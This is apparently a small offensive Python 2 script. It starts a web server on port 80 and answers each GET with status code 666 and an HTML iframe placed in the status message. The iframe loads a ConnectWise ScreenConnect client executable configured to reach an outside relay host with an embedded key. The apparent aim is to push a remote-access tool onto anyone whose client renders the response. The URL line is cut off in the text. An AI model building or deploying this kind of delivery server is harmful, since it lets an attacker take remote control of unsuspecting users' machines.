from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import time

hostName = "0.0.0.0"
serverPort = 80

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(666, message="<iframe src=\"https://teamtradecraft.screenconnect.com/Bin/ConnectWiseControl.Client.exe?h=instance-mnaq0v-relay.screenconnect.com&p=443&k=BgIAAACkAABSU0ExAAgAAAEAAQApjCII1jPSn%2F7DyuSCWun%2BDg%2$
        self.send_header("Content-type", "text/html")
        self.end_headers()

if __name__ == "__main__":
    webServer = HTTPServer((hostName, serverPort), MyServer)
    print "Server started http://%s:%s" % (hostName, serverPort)

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print "Server stopped."

